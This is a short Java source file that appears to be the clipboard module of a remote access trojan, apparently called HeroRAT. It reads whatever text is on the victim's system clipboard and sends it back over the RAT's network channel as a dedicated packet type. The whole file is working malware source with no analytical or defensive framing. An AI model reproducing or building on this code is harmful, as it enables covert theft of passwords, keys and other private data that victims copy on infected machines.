package net.herorat.features.clipboard;

import java.awt.Toolkit;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.Transferable;
import java.io.DataOutputStream;

import net.herorat.network.Packet;
import net.herorat.network.Packet15Clipboard;


public class Clipboard
{
	public static void handle(String[] args, DataOutputStream outputstream)
	{
		Packet p = new Packet15Clipboard(outputstream, new String[] { get() });
		p.write();
	}

	public static String get()
	{
		Transferable t = Toolkit.getDefaultToolkit().getSystemClipboard().getContents(null);
		try
		{
			if (t != null && t.isDataFlavorSupported(DataFlavor.stringFlavor))
			{
				String text = (String) t.getTransferData(DataFlavor.stringFlavor);
				return text;
			}
		}
		catch (Exception e) {}
		
		return "";
	}
}